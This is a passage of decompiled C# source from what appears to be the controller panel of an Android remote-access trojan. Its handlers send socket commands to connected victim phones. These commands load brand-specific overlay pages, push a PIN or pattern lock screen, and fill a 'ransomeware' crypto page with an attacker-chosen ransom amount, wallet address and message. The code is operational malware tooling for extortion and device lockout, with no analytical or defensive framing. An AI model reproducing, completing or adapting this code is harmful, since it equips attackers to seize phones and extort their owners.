						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.Classclient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.Classclient
					};
					this.Classclient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000933 RID: 2355 RVA: 0x000E5C28 File Offset: 0x000E3E28
		private void drakeUIButtonIcon9_Click_1(object sender, EventArgs e)
		{
			this.Replacecurrency();
			this.Replacecaddress();
			this.ReplacecDES();
			this.poco();
			this.huawei();
			this.motorola();
			this.pixel();
			this.vivo();
			this.oppo();
			this.samsung();
			this.redmi();
			this.realme();
		}

		// Token: 0x06000934 RID: 2356 RVA: 0x000E5C80 File Offset: 0x000E3E80
		private void drakeUIButtonIcon10_Click(object sender, EventArgs e)
		{
			string text = "poco";
			string[] array = this.Classclient.Keys.Split(new char[] { ':' });
			object[] array2 = new object[]
			{
				this.Classclient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text,
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(array2);
			string text2 = "huawei";
			string[] array3 = this.Classclient.Keys.Split(new char[] { ':' });
			object[] array4 = new object[]
			{
				this.Classclient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text2,
					Data.SPL_SOCKET,
					array3[0],
					Data.SPL_SOCKET,
					array3[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(array4);
			string text3 = "motorola";
			string[] array5 = this.Classclient.Keys.Split(new char[] { ':' });
			object[] array6 = new object[]
			{
				this.Classclient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text3,
					Data.SPL_SOCKET,
					array5[0],
					Data.SPL_SOCKET,
					array5[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(array6);
			string text4 = "pixel";
			string[] array7 = this.Classclient.Keys.Split(new char[] { ':' });
			object[] array8 = new object[]
			{
				this.Classclient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text4,
					Data.SPL_SOCKET,
					array7[0],
					Data.SPL_SOCKET,
					array7[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(array8);
			string text5 = "vivo";
			string[] array9 = this.Classclient.Keys.Split(new char[] { ':' });
			object[] array10 = new object[]
			{
				this.Classclient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text5,
					Data.SPL_SOCKET,
					array9[0],
					Data.SPL_SOCKET,
					array9[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(array10);
			string text6 = "oppo";
			string[] array11 = this.Classclient.Keys.Split(new char[] { ':' });
			object[] array12 = new object[]
			{
				this.Classclient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text6,
					Data.SPL_SOCKET,
					array11[0],
					Data.SPL_SOCKET,
					array11[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(array12);
			string text7 = "samsung";
			string[] array13 = this.Classclient.Keys.Split(new char[] { ':' });
			object[] array14 = new object[]
			{
				this.Classclient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text7,
					Data.SPL_SOCKET,
					array13[0],
					Data.SPL_SOCKET,
					array13[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(array14);
			string text8 = "redmi";
			string[] array15 = this.Classclient.Keys.Split(new char[] { ':' });
			object[] array16 = new object[]
			{
				this.Classclient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text8,
					Data.SPL_SOCKET,
					array15[0],
					Data.SPL_SOCKET,
					array15[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(array16);
			string text9 = "realme";
			string[] array17 = this.Classclient.Keys.Split(new char[] { ':' });
			object[] array18 = new object[]
			{
				this.Classclient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text9,
					Data.SPL_SOCKET,
					array17[0],
					Data.SPL_SOCKET,
					array17[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(array18);
		}

		// Token: 0x06000935 RID: 2357 RVA: 0x000E65FC File Offset: 0x000E47FC
		private void Replacecurrency()
		{
			string text = "C:\\xampp\\htdocs\\ransomeware\\crypto.html";
			string text2 = "<h1>" + this.guna2TextBox3.Text + "</h1>";
			try
			{
				string[] array = File.ReadAllLines(text);
				if (array.Length >= 123)
				{
					array[122] = text2;
					File.WriteAllLines(text, array);
					this.label10.Text = "'Success";
				}
				else
				{
					this.label10.Text = "'error";
				}
			}
			catch (Exception)
			{
				this.label10.Text = "'Error";
			}
		}

		// Token: 0x06000936 RID: 2358 RVA: 0x000E668C File Offset: 0x000E488C
		private void Replacecaddress()
		{
			string text = "return";
			string text2 = "C:\\xampp\\htdocs\\ransomeware\\crypto.html";
			string text3 = text + " '" + this.guna2TextBox5.Text + "'";
			try
			{
				string[] array = File.ReadAllLines(text2);
				if (array.Length >= 193)
				{
					array[192] = text3;
					File.WriteAllLines(text2, array);
					this.label10.Text = "'Success";
				}
				else
				{
					this.label10.Text = "'error";
				}
			}
			catch (Exception)
			{
				this.label10.Text = "'Error";
			}
		}

		// Token: 0x06000937 RID: 2359 RVA: 0x000E6728 File Offset: 0x000E4928
		private void ReplacecDES()
		{
			string text = "C:\\xampp\\htdocs\\ransomeware\\crypto.html";
			string text2 = "<p>" + this.drakeUIRichTextBox1.Text + "<p>";
			try
			{
				string[] array = File.ReadAllLines(text);
				if (array.Length >= 136)
				{
					array[135] = text2;
					File.WriteAllLines(text, array);
					this.label10.Text = "'Success";
				}
				else
				{
					this.label10.Text = "'error";
				}
			}
			catch (Exception)
			{
				this.label10.Text = "'Error";
			}
		}

		// Token: 0x06000938 RID: 2360 RVA: 0x000E67C0 File Offset: 0x000E49C0
		private void drakeUIButtonIcon8_Click_1(object sender, EventArgs e)
		{
			this.Replacelockpin();
			try
			{
				string text = "C:\\xampp\\htdocs\\lock\\pin.html";
				TcpClient myClient = this.Classclient.myClient;
				string[] array = this.Classclient.Keys.Split(new char[] { ':' });
				string text2 = Conversions.ToString(Codes.BSEN(File.ReadAllText(text)));
				object[] array2 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"ussd<*>",
						text2,
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(array2);
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000939 RID: 2361 RVA: 0x000E6910 File Offset: 0x000E4B10
		private void DisplayIPv4Address()
		{
			try
			{
				IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
				string text = null;
				IPAddress[] addressList = hostEntry.AddressList;
				foreach (IPAddress ipaddress in addressList)
				{
					if (ipaddress.AddressFamily == AddressFamily.InterNetwork)
					{
						text = ipaddress.ToString();
						break;
					}
				}
				if (text != null)
				{
					this.label11.Text = text ?? "";
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600093A RID: 2362 RVA: 0x0000522C File Offset: 0x0000342C
		private void WebViewMonitor_Load(object sender, EventArgs e)
		{
			this.DisplayIPv4Address();
		}

		// Token: 0x0600093B RID: 2363 RVA: 0x000E698C File Offset: 0x000E4B8C
		private void drakeUIButtonIcon6_Click_1(object sender, EventArgs e)
		{
			string text = "pattern";
			string[] array = this.Classclient.Keys.Split(new char[] { ':' });
			object[] array2 = new object[]
			{
				this.Classclient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"lodp<*>re<*>",
					text,
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(array2);
		}

		// Token: 0x0600093C RID: 2364 RVA: 0x000E6AA0 File Offset: 0x000E4CA0
		private void Replacelockpin()
		{
			string text = "C:\\xampp\\htdocs\\lock\\pin.html";
			string text2 = "<h1>" + this.guna2TextBox2.Text + "</h1>";
			try
			{
				string[] array = File.ReadAllLines(text);
				if (array.Length >= 141)
				{
					array[140] = text2;
					File.WriteAllLines(text, array);
					this.label10.Text = "'Success";
				}
				else
				{
					this.label10.Text = "'error";
				}
			}
			catch (Exception)
			{
				this.label10.Text = "'Error";
			}
		}

		// Token: 0x0600093D RID: 2365 RVA: 0x000E6B38 File Offset: 0x000E4D38
		private void Replacelockpattern()
		{
			string text = "C:\\xampp\\htdocs\\lock\\pattern.html";
			string text2 = "<h1>" + this.guna2TextBox1.Text + "</h1>";
			try
			{
				string[] array = File.ReadAllLines(text);
				if (array.Length >= 107)
				{
					array[106] = text2;
					File.WriteAllLines(text, array);
					this.label10.Text = "'Success";
				}
				else
				{
					this.label10.Text = "'error";
				}
			}
			catch (Exception)
			{
				this.label10.Text = "'Error";
			}
		}

		// Token: 0x04000AEA RID: 2794
		public Client Classclient;

		// Token: 0x04000AEB RID: 2795
		public string Title;

		// Token: 0x04000AEC RID: 2796
		public object firstclick;

		// Token: 0x04000AED RID: 2797
		public Dictionary<string, string> MapData;

		// Token: 0x04000AEE RID: 2798
		private int y;

		// Token: 0x04000B0C RID: 2828
		[AccessedThroughProperty("DrakeUIButtonIcon1")]
		internal DrakeUIButtonIcon DrakeUIButtonIcon1;

		// Token: 0x04000B0D RID: 2829
		[AccessedThroughProperty("DrakeUIButtonIcon2")]
		internal DrakeUIButtonIcon DrakeUIButtonIcon2;

		// Token: 0x04000B0E RID: 2830
		[AccessedThroughProperty("DrakeUITextBox1")]
		internal DrakeUITextBox DrakeUITextBox1;

		// Token: 0x04000B0F RID: 2831
		[AccessedThroughProperty("Label1")]
		internal Label Label1;

		// Token: 0x04000B10 RID: 2832
		[AccessedThroughProperty("DrakeUITextBox3")]
		internal DrakeUITextBox DrakeUITextBox3;

		// Token: 0x04000B11 RID: 2833
		[AccessedThroughProperty("DrakeUITextBox2")]
		internal DrakeUITextBox DrakeUITextBox2;

		// Token: 0x04000B12 RID: 2834
		[AccessedThroughProperty("DrakeUIButtonIcon4")]
		internal DrakeUIButtonIcon DrakeUIButtonIcon4;

		// Token: 0x04000B13 RID: 2835
		[AccessedThroughProperty("Actionslistcombo")]
		internal DrakeUIComboBox Actionslistcombo;

		// Token: 0x04000B14 RID: 2836
		[AccessedThroughProperty("TargetsListcombo")]
		internal DrakeUIComboBox TargetsListcombo;

		// Token: 0x04000B15 RID: 2837
		[AccessedThroughProperty("DrakeUIButtonIcon3")]
		internal DrakeUIButtonIcon DrakeUIButtonIcon3;
	}
}
